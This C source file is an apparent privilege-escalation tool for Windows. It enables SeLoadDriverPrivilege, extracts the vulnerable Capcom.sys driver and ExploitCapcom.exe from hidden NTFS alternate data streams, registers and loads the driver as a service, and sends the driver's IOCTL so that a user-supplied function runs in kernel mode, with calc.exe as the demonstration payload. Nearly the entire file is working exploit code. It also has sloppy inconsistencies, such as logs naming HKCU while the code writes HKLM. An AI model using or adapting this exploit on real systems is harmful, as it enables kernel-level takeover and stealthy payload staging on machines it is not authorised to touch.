/*
Compile with:
x86_64-w64-mingw32-gcc -o SeLoadDriverPrivilege.exe SeLoadDriverPrivilege.c -lwininet -ladvapi32 -luser32

Enable the SeLoadDriverPrivilege of current process and then load the driver into the kernel.
The program extracts Capcom.sys and ExploitCapcom.exe from its own ADS streams and loads the driver.
*/

#include <windows.h>
#include <wininet.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// For MinGW compatibility
#ifndef SE_PRIVILEGE_ENABLED
#define SE_PRIVILEGE_ENABLED 0x00000002L
#endif
#ifndef SE_PRIVILEGE_ENABLED_BY_DEFAULT
#define SE_PRIVILEGE_ENABLED_BY_DEFAULT 0x00000001L
#endif
#ifndef SE_PRIVILEGE_REMOVED
#define SE_PRIVILEGE_REMOVED 0x00000004L
#endif
#ifndef SE_PRIVILEGE_USED_FOR_ACCESS
#define SE_PRIVILEGE_USED_FOR_ACCESS 0x80000000L
#endif

// Function prototypes for dynamic loading
typedef NTSTATUS(NTAPI *NT_LOAD_DRIVER)(IN PUNICODE_STRING DriverServiceName);
typedef VOID(NTAPI *RTL_INIT_UNICODE_STRING)(PUNICODE_STRING, PCWSTR);
typedef ULONG(NTAPI *RTL_NTSTATUS_TO_DOS_ERROR)(NTSTATUS Status);

BOOL IsPEFile(const BYTE* data, DWORD size) {
    if (size < sizeof(IMAGE_DOS_HEADER)) return FALSE;
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)data;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    
    if (size < dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)) return FALSE;
    
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(data + dosHeader->e_lfanew);
    return ntHeader->Signature == IMAGE_NT_SIGNATURE;
}

BOOL ExtractFileFromADS(const WCHAR* selfPath, const WCHAR* streamName, const WCHAR* outputPath) {
    printf("[*] Attempting to extract ADS...\n");
    printf("[*] Self path: %ls\n", selfPath);
    printf("[*] Stream name: %ls\n", streamName);
    printf("[*] Output path: %ls\n", outputPath);

    // First try without $DATA suffix
    WCHAR fullStreamPath[MAX_PATH];
    swprintf(fullStreamPath, MAX_PATH, L"%ls:%ls", selfPath, streamName);
    
    HANDLE hStream = CreateFileW(fullStreamPath, 
                               GENERIC_READ, 
                               FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
                               NULL, 
                               OPEN_EXISTING, 
                               FILE_FLAG_SEQUENTIAL_SCAN, 
                               NULL);

    // If first attempt fails, try with explicit $DATA stream
    if (hStream == INVALID_HANDLE_VALUE) {
        swprintf(fullStreamPath, MAX_PATH, L"%ls:%ls:$DATA", selfPath, streamName);
        printf("[*] Retrying with $DATA suffix: %ls\n", fullStreamPath);
        
        hStream = CreateFileW(fullStreamPath, 
                            GENERIC_READ, 
                            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
                            NULL, 
                            OPEN_EXISTING, 
                            FILE_FLAG_SEQUENTIAL_SCAN, 
                            NULL);
    }
    
    if (hStream == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        printf("[-] Failed to open stream %ls\n", streamName);
        printf("[-] Full path attempted: %ls\n", fullStreamPath);
        printf("[-] Error code: %lu\n", error);
        if (error == ERROR_INVALID_NAME) {
            printf("[-] Invalid file name format\n");
        } else if (error == ERROR_FILE_NOT_FOUND) {
            printf("[-] ADS stream not found - did you create it with 'type file.exe > program.exe:file.exe'?\n");
        } else if (error == ERROR_ACCESS_DENIED) {
            printf("[-] Access denied - try running as administrator\n");
        }
        return FALSE;
    }
    
    DWORD fileSize = GetFileSize(hStream, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        printf("[-] Failed to get stream size or stream is empty\n");
        CloseHandle(hStream);
        return FALSE;
    }
    
    BYTE* fileData = (BYTE*)malloc(fileSize);
    if (!fileData) {
        printf("[-] Failed to allocate memory for file data\n");
        CloseHandle(hStream);
        return FALSE;
    }
    
    DWORD bytesRead;
    if (!ReadFile(hStream, fileData, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[-] Failed to read stream data\n");
        free(fileData);
        CloseHandle(hStream);
        return FALSE;
    }
    
    CloseHandle(hStream);
    
    // Skip PE validation - raw binary data
    printf("[*] Reading %lu bytes from stream\n", fileSize);
    
    // Write validated data to output file
    HANDLE hOutput = CreateFileW(outputPath, 
                               GENERIC_WRITE | GENERIC_READ, 
                               FILE_SHARE_READ | FILE_SHARE_WRITE, 
                               NULL, 
                               CREATE_ALWAYS, 
                               FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, 
                               NULL);
    
    if (hOutput == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create output file %ls: %lu\n", outputPath, GetLastError());
        free(fileData);
        return FALSE;
    }
    
    DWORD bytesWritten;
    BOOL success = WriteFile(hOutput, fileData, fileSize, &bytesWritten, NULL) && 
                  bytesWritten == fileSize;
    
    if (!success) {
        printf("[-] Failed to write to output file\n");
    } else {
        printf("[+] Successfully extracted %ls (Size: %lu bytes)\n", outputPath, fileSize);
    }
    
    free(fileData);
    CloseHandle(hOutput);
    return success;
}

BOOL SetupRegistryKeys()
{
    HKEY hKey;
    LONG result;
    DWORD dwValue;
    WCHAR currentDir[MAX_PATH];
    WCHAR driverPath[MAX_PATH];
    
    printf("[+] Creating registry keys for Capcom driver...\n");
    
    // Get full current directory path
    WCHAR fullPath[MAX_PATH];
    DWORD pathLen = GetCurrentDirectoryW(MAX_PATH, fullPath);
    if (pathLen == 0) {
        printf("[-] Failed to get current directory: error %lu\n", GetLastError());
        return FALSE;
    }
    
    // Get absolute path and ensure proper format for driver loading
    DWORD len = GetFullPathNameW(fullPath, MAX_PATH, currentDir, NULL);
    if (len == 0) {
        printf("[-] Failed to get full path: error %lu\n", GetLastError());
        return FALSE;
    }
    
    // Build NT-style path format required by driver loader
    swprintf(driverPath, MAX_PATH, L"\\??\\%ls\\Capcom.sys", currentDir);
    
    // Convert any remaining backslashes to forward slashes
    WCHAR *p = driverPath;
    while (*p) {
        if (*p == L'\\') {
            if (*(p+1) == L'\\') p++; // Skip if it's already a double backslash
            else *p = L'\\';
        }
        p++;
    }
    
    printf("[+] Creating registry key: HKCU\\System\\CurrentControlSet\\CAPCOM\n");
    
    // Handle registry redirection for 64-bit Windows
    DWORD flags = KEY_ALL_ACCESS;
#ifdef _WIN64
    flags |= KEY_WOW64_64KEY;
#endif

    // Create/Open registry key HKLM\System\CurrentControlSet\Services\CAPCOM
    result = RegCreateKeyExW(HKEY_LOCAL_MACHINE,
                            L"System\\CurrentControlSet\\Services\\CAPCOM",
                            0, NULL,
                            REG_OPTION_NON_VOLATILE,
                            flags,
                            NULL,
                            &hKey,
                            NULL);
    
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to create registry key (Error: %ld)\n", result);
        return FALSE;
    }
    
    printf("[+] Setting ImagePath value: %ws\n", driverPath);
    
    // Set ImagePath value (REG_SZ)
    // Equivalent to: reg add hkcu\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\path\Capcom.sys"
    result = RegSetValueExW(hKey,
                           L"ImagePath",
                           0,
                           REG_SZ,
                           (BYTE*)driverPath,
                           (wcslen(driverPath) + 1) * sizeof(WCHAR));
    
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to set ImagePath registry value (Error: %ld)\n", result);
        RegCloseKey(hKey);
        return FALSE;
    }
    
    printf("[+] Setting Type value: 1 (REG_DWORD)\n");
    
    // Set Type value (REG_DWORD = 1)
    // Equivalent to: reg add hkcu\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
    dwValue = 1;
    result = RegSetValueExW(hKey,
                           L"Type",
                           0,
                           REG_DWORD,
                           (BYTE*)&dwValue,
                           sizeof(DWORD));
    
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to set Type registry value (Error: %ld)\n", result);
        RegCloseKey(hKey);
        return FALSE;
    }
    
    RegCloseKey(hKey);
    
    wprintf(L"[+] Registry keys created successfully!\n");
    wprintf(L"    Key: HKCU\\System\\CurrentControlSet\\CAPCOM\n");
    wprintf(L"    ImagePath (REG_SZ): %ls\n", driverPath);
    wprintf(L"    Type (REG_DWORD): 1\n");
    wprintf(L"[+] These are equivalent to the manual commands:\n");
    wprintf(L"    reg add hkcu\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"%ls\"\n", driverPath);
    wprintf(L"    reg add hkcu\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1\n");
    
    return TRUE;
}

LPWSTR getUserSid(HANDLE hToken)
{
    DWORD dwBufferSize = 0;
    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwBufferSize) &&
        (GetLastError() != ERROR_INSUFFICIENT_BUFFER))
    {
        wprintf(L"GetTokenInformation failed, error: %d\n", GetLastError());
        return NULL;
    }

    PTOKEN_USER pUserToken = (PTOKEN_USER)HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        dwBufferSize);

    if (pUserToken == NULL) {
        return NULL;
    }

    if (!GetTokenInformation(hToken, TokenUser, pUserToken, dwBufferSize, &dwBufferSize))
    {
        HeapFree(GetProcessHeap(), 0, (LPVOID)pUserToken);
        return NULL;
    }

    if (!IsValidSid(pUserToken->User.Sid))
    {
        wprintf(L"The owner SID is invalid.\n");
        HeapFree(GetProcessHeap(), 0, (LPVOID)pUserToken);
        return NULL;
    }

    LPWSTR sidString;
    ConvertSidToStringSidW(pUserToken->User.Sid, &sidString);
    HeapFree(GetProcessHeap(), 0, (LPVOID)pUserToken);
    return sidString;
}

ULONG LoadDriver(HANDLE hToken)
{
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    DWORD lastError;
    WCHAR servicePath[MAX_PATH];
    WCHAR driverPath[MAX_PATH];
    
    // Get current directory and build paths
    if (!GetFullPathNameW(L"Capcom.sys", MAX_PATH, driverPath, NULL)) {
        printf("[-] Failed to get driver path: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Driver path: %ls\n", driverPath);
    
    // Create temporary service
    hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) {
        printf("[-] Failed to open SC Manager: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Creating temporary service...\n");
    hService = CreateServiceW(hSCManager, 
                            L"Capcom",
                            L"Capcom",
                            SERVICE_ALL_ACCESS,
                            SERVICE_KERNEL_DRIVER,
                            SERVICE_DEMAND_START,
                            SERVICE_ERROR_NORMAL,
                            driverPath,
                            NULL, NULL, NULL, NULL, NULL);

    if (!hService) {
        lastError = GetLastError();
        if (lastError == ERROR_SERVICE_EXISTS) {
            printf("[*] Service already exists, trying to open it...\n");
            hService = OpenServiceW(hSCManager, L"Capcom", SERVICE_ALL_ACCESS);
            if (!hService) {
                printf("[-] Failed to open existing service: %lu\n", GetLastError());
                CloseServiceHandle(hSCManager);
                return 1;
            }
        } else {
            printf("[-] Failed to create service: %lu\n", lastError);
            CloseServiceHandle(hSCManager);
            return 1;
        }
    }

    printf("[+] Starting driver...\n");
    if (!StartServiceW(hService, 0, NULL)) {
        lastError = GetLastError();
        if (lastError != ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[-] StartService failed: %lu\n", lastError);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return lastError;
        }
        printf("[*] Service already running\n");
    }

    printf("[+] Driver loaded successfully!\n");
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

int IsTokenSystem(HANDLE tok)
{
    DWORD Size, UserSize, DomainSize;
    SID *sid;
    SID_NAME_USE SidType;
    WCHAR UserName[64], DomainName[64];
    TOKEN_USER *User;
    
    Size = 0;
    GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
    if (!Size)
        return 0;

    User = (TOKEN_USER *)malloc(Size);
    if (!User) return 0;
    
    GetTokenInformation(tok, TokenUser, User, Size, &Size);
    if (!Size) {
        free(User);
        return 0;
    }
    
    Size = GetLengthSid(User->User.Sid);
    if (!Size) {
        free(User);
        return 0;
    }
    
    sid = (SID *)malloc(Size);
    if (!sid) {
        free(User);
        return 0;
    }

    CopySid(Size, sid, User->User.Sid);
    UserSize = 63;
    DomainSize = 63;
    LookupAccountSidW(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
    
    wprintf(L"whoami:\n%ls\\%ls\n", DomainName, UserName);
    
    free(sid);
    free(User);
    
    if (!_wcsicmp(UserName, L"SYSTEM"))
        return 0;
    return 1;
}

VOID RetPrivDwordAttributesToStr(DWORD attributes, LPWSTR szAttrbutes)
{
    int len = 0;
    size_t remaining_size = 1024; // Corresponds to lpszAttrbutes in GetTokenPrivilege
    szAttrbutes[0] = 0;
    
    if (attributes & SE_PRIVILEGE_ENABLED)
        len += swprintf(szAttrbutes + len, remaining_size - len, L"Enabled ");
    if (attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT)
        len += swprintf(szAttrbutes + len, remaining_size - len, L"Enabled by default ");
    if (attributes & SE_PRIVILEGE_REMOVED)
        len += swprintf(szAttrbutes + len, remaining_size - len, L"Removed ");
    if (attributes & SE_PRIVILEGE_USED_FOR_ACCESS)
        len += swprintf(szAttrbutes + len, remaining_size - len, L"Used for access ");
    if (szAttrbutes[0] == 0)
        swprintf(szAttrbutes, remaining_size, L"Disabled");
    return;
}

int GetTokenPrivilege(HANDLE tok)
{
    PTOKEN_PRIVILEGES ppriv = NULL;
    DWORD dwRet = 0;
    
    GetTokenInformation(tok, TokenPrivileges, ppriv, dwRet, &dwRet);
    if (!dwRet)
        return 0;
        
    ppriv = (PTOKEN_PRIVILEGES)calloc(dwRet, 1);
    if (!ppriv) return 0;
    
    GetTokenInformation(tok, TokenPrivileges, ppriv, dwRet, &dwRet);
    printf("\nwhoami /priv\n");
    
    for (DWORD i = 0; i < ppriv->PrivilegeCount; i++)
    {
        WCHAR lpszPriv[MAX_PATH] = { 0 };
        DWORD dwPrivLen = MAX_PATH;
        BOOL n = LookupPrivilegeNameW(NULL, &(ppriv->Privileges[i].Luid), lpszPriv, &dwPrivLen);
        wprintf(L"%-50ls", lpszPriv);
        WCHAR lpszAttrbutes[1024] = { 0 };
        RetPrivDwordAttributesToStr(ppriv->Privileges[i].Attributes, lpszAttrbutes);
        wprintf(L"%ls\n", lpszAttrbutes);
    }
    
    free(ppriv);
    return 1;
}

BOOL EnablePriv(HANDLE hToken, LPCWSTR priv)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValueW(NULL, priv, &luid))
    {
        printf("[-] LookupPrivilegeValue error\n");
        return FALSE;
    }
    
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("[-] AdjustTokenPrivileges error for %ls: %lu\n", priv, GetLastError());
        return FALSE;
    }

    // Check if the privilege was actually enabled
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        if (wcscmp(priv, L"SeLoadDriverPrivilege") == 0) {
            printf("[-] Failed to enable %ls - not held by process\n", priv);
            return FALSE;
        }
        return TRUE; // Silently continue if non-critical privilege fails
    }

    if (wcscmp(priv, L"SeLoadDriverPrivilege") == 0) {
        printf("[+] %ls enabled successfully\n", priv);
    }
    return TRUE;
}

// Payload function to be executed by the driver in kernel mode.
// This will launch calc.exe in the user's session.
void RunCalc()
{
    // Use full path to calc.exe to avoid ERROR_FILE_NOT_FOUND
    WinExec("C:\\Windows\\System32\\calc.exe", SW_SHOWNORMAL);
}

#define CAPCOM_IOCTL 0xAA013044

#pragma pack(push, 1)
typedef struct {
    DWORD64 Tag;  // Must be 0xDEADBEEFDEADBEEF
    void* Function;  // Function to execute
} EXPLOIT_BUFFER;

// Triggers the vulnerability in Capcom.sys to execute our payload.
BOOL TriggerExploit()
{
    HANDLE hDevice;
    DWORD dwBytesReturned;

    printf("[+] Opening handle to Capcom device... \\\\.\\Htsysm72FB\n");
    
    // Device name for Capcom driver
    hDevice = CreateFileA("\\\\.\\Htsysm72FB",
                         GENERIC_READ | GENERIC_WRITE,
                         FILE_SHARE_READ | FILE_SHARE_WRITE,
                         NULL,
                         OPEN_EXISTING,
                         FILE_ATTRIBUTE_NORMAL,
                         NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open handle to device (Error: %ld)\n", GetLastError());
        printf("[-] Make sure the driver is loaded correctly.\n");
        return FALSE;
    }

    printf("[+] Device handle opened successfully: 0x%p\n", hDevice);

    // Setup the exploit buffer exactly as in reference
    EXPLOIT_BUFFER payload = {0};
    payload.Tag = 0xDEADBEEFDEADBEEF;  // Magic value required by driver
    payload.Function = RunCalc;

    printf("[+] Payload function address: 0x%p\n", payload.Function);

    // Send IOCTL exactly as in reference code
    DWORD OutBuffer = 0;
    if (!DeviceIoControl(hDevice,
                        CAPCOM_IOCTL,
                        &payload,
                        sizeof(payload),
                        &OutBuffer,
                        sizeof(OutBuffer),
                        &dwBytesReturned,
                        NULL))
    {
        printf("[-] Failed to send IOCTL (Error: %ld)\n", GetLastError());
        CloseHandle(hDevice);
        return FALSE;
    }

    printf("[+] IOCTL sent successfully!\n");
    printf("[+] If exploit was successful, calc.exe should be running.\n");

    CloseHandle(hDevice);
    return TRUE;
}



int main(int argc, char* argv[])
{
    HANDLE hToken;
    WCHAR selfPath[MAX_PATH];
    
    printf("=== Capcom Driver Loader ===\n");
    
    // Get our own executable path
    if (!GetModuleFileNameW(NULL, selfPath, MAX_PATH)) {
        printf("[-] Failed to get executable path: %lu\n", GetLastError());
        return 1;
    }
    
    // Extract files from ADS using PowerShell
    printf("[*] Extracting files using PowerShell...\n");
    char selfPathA[MAX_PATH];
    char psCmd[2048];
    
    // Convert wide string to multibyte
    wcstombs(selfPathA, selfPath, MAX_PATH);
    
    // Extract files using multibyte strings
    snprintf(psCmd, sizeof(psCmd),
             "powershell -Command \"Get-Item -Path '%s' -Stream Capcom.sys | Get-Content -Encoding Byte -Raw | Set-Content -Encoding Byte -Path Capcom.sys\"",
             selfPathA);
    system(psCmd);
    
    snprintf(psCmd, sizeof(psCmd),
             "powershell -Command \"Get-Item -Path '%s' -Stream ExploitCapcom.exe | Get-Content -Encoding Byte -Raw | Set-Content -Encoding Byte -Path ExploitCapcom.exe\"",
             selfPathA);
    system(psCmd); // This was the missing call!

    // Verify files were extracted
    HANDLE hFile = CreateFileA("Capcom.sys", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to verify Capcom.sys extraction\n");
        return 1;
    }
    CloseHandle(hFile);

    // Verify ExploitCapcom.exe extraction (single attempt as requested)
    hFile = CreateFileA("ExploitCapcom.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to verify ExploitCapcom.exe extraction.\n");
        return 1; 
    }
    CloseHandle(hFile); // Close the handle if successful
    
    printf("[+] Files extracted successfully\n");
    
    // If driver service is already installed, stop and delete it to allow for a clean reinstallation.
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) {
        printf("[-] Failed to open SC Manager: %lu\n", GetLastError());
        return 1;
    }

    SC_HANDLE hService = OpenServiceW(hSCManager, L"Capcom", SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
    if (hService) {
        printf("[*] Existing Capcom service found. Attempting to stop and delete for reinstallation.\n");
        SERVICE_STATUS status;
        // Try to stop the service if it's running
        if (QueryServiceStatus(hService, &status) && (status.dwCurrentState == SERVICE_RUNNING)) {
            if (ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
                printf("[+] Service stop command sent. Waiting for it to terminate...\n");
                Sleep(2000); // Wait a bit for the service to stop
            } else {
                printf("[!] Failed to stop the service: %lu. Deletion might fail.\n", GetLastError());
            }
        }
        
        // Delete the service
        if (!DeleteService(hService)) {
            printf("[-] Failed to delete existing service: %lu. Reinstallation might fail.\n", GetLastError());
        } else {
            printf("[+] Existing service deleted successfully.\n");
        }
        CloseServiceHandle(hService);
    }
    CloseServiceHandle(hSCManager);

    // At this point, any pre-existing service should be gone. We can proceed with a fresh installation.
    // Check if driver file exists in current directory before proceeding
    hFile = CreateFileA("Capcom.sys", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Capcom.sys not found in current directory, cannot proceed.\n");
        return 1;
    }
    CloseHandle(hFile);
    
    // Get process token with all necessary access rights
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | TOKEN_ALL_ACCESS, &hToken)) {
        printf("[-] OpenProcessToken error: %lu\n", GetLastError());
        return 1;
    }

    // Enable SeLoadDriverPrivilege first and verify it's enabled
    if (!EnablePriv(hToken, L"SeLoadDriverPrivilege")) {
        printf("[-] Critical privilege SeLoadDriverPrivilege could not be enabled\n");
        CloseHandle(hToken);
        return 1;
    }

    // Enable other privileges - continue if they fail
    EnablePriv(hToken, L"SeSecurityPrivilege");     // Optional privilege
    EnablePriv(hToken, L"SeTakeOwnershipPrivilege");  // Optional privilege
    EnablePriv(hToken, L"SeBackupPrivilege");         // Optional privilege
    EnablePriv(hToken, L"SeRestorePrivilege");        // Optional privilege

    // Show current user and privileges to verify
    IsTokenSystem(hToken);
    GetTokenPrivilege(hToken);

    printf("[+] Starting driver loading process...\n");

    // Skip file and registry operations if driver is already installed
    
    ULONG result = 0;
    
    // Setup registry keys
    if (!SetupRegistryKeys()) {
        printf("[-] Failed to setup registry keys\n");
        CloseHandle(hToken);
        return 1;
    }
    
    // Load the driver
    result = LoadDriver(hToken);
    if (result != 0) {
        printf("[-] Driver loading failed with error: %lu\n", result);
        CloseHandle(hToken);
        return result;
    }
    
    CloseHandle(hToken);
    
    if (result == 0) {
        printf("[+] Driver loaded successfully!\n");
        printf("[+] Launching ExploitCapcom.exe...\n");
        
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        
        if (!CreateProcessW(L"ExploitCapcom.exe", L"ExploitCapcom.exe", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
            printf("[-] Failed to launch ExploitCapcom.exe: %lu\n", GetLastError());
            result = 1;
        } else {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            printf("[+] ExploitCapcom.exe launched successfully\n");
        }
    }
    
    if (result == 0) {
        printf("\n[+] All operations completed successfully!\n");
    }
    
    return result;
}
